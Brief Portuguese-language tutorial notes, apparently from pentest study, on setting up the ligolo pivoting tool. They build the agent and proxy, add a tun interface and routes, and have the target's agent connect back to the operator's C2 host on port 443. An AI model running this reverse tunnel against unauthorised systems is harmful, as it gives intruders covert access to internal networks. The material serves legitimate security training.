
Antes de configurar o  `ligolo` devemos ter o `golang` instaldo. Somente se tiver baixado o source code. Se não, depois de extrair com o **tar -xvzf** ele vai gerar **proxy** e **agent** e então você pode colocar o **agent** na máquina alvo.

```bash
$ go build -o agent cmd/agent/main.go -> coloco no alvo
$ go build -o proxy cmd/proxy/main.go -> executo na minha máquina
```

Como estamos usando o linux precisamos criar uma **interface de tunelamento** no **Proxy Server (C2)**

```bash
$ sudo ip tuntap add user [your_username] mode tun ligolo - só a 1ª vez
$ sudo ip tuntap add user xcapgz mode tun ligolo - só a 1ª vez (meu caso)
$ sudo ip link set ligolo up - só 1 vez só, mas é bom conferir e fazer sempre
```

```bash
ip route add 10.10.150.0/24 dev ligolo -> 10.10.150.0 na verdade é o ip alvo
se for 127.0.0.1 então usamos sudo ip route add 240.0.0.1/32 dev ligolo
```

```bash
./proxy -selfcert -laddr 0.0.0.0:443
```


Agora no alvo:

```bash
./agent -connect 172.23.10.62:443 -ignore-cert
```

E no **proxy|ligolo** nós digitamos: `session` selecionamos a sessão.
E depois iniciamos o túnel: `tunnel_start`



